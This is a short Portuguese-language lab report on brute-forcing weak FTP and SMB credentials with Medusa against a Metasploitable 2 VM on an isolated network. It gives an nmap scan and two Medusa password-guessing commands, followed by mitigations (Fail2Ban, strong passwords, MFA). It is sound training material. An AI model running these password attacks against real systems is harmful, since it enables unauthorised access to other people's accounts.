# 🛡️ Relatório de Auditoria: Brute Force com Medusa

## 📝 Descrição do Projeto
Este projeto documenta a simulação de ataques de força bruta em um ambiente controlado (Lab). O objetivo é demonstrar como a ferramenta **Medusa** identifica credenciais fracas em serviços como FTP e SMB, e como prevenir esses ataques.

## 🛠️ Configuração do Ambiente (Simulação)
- **Atacante:** Kali Linux (IP: 192.168.56.101)
- **Vítima:** Metasploitable 2 (IP: 192.168.56.102)
- **Rede:** Host-Only (Isolada)

## 🚀 Passo a Passo dos Testes

### 1. Varredura de Portas
Comando para identificar serviços abertos no alvo:
`nmap -sV 192.168.56.102`

### 2. Ataque ao FTP
Comando utilizado para testar uma lista de senhas contra o usuário 'msfadmin':
`medusa -h 192.168.56.102 -u msfadmin -P wordlist.txt -M ftp`

### 3. Ataque ao SMB (Windows Share)
Comando para testar acesso a pastas compartilhadas:
`medusa -h 192.168.56.102 -u admin -P wordlist.txt -M smbnt`

## 🔐 Como se proteger (Mitigação)
1. **Bloqueio de IP:** Usar o `Fail2Ban` para banir quem errar a senha 3 vezes.
2. **Senhas Fortes:** Exigir letras, números e símbolos.
3. **MFA:** Usar autenticação em duas etapas sempre que possível.
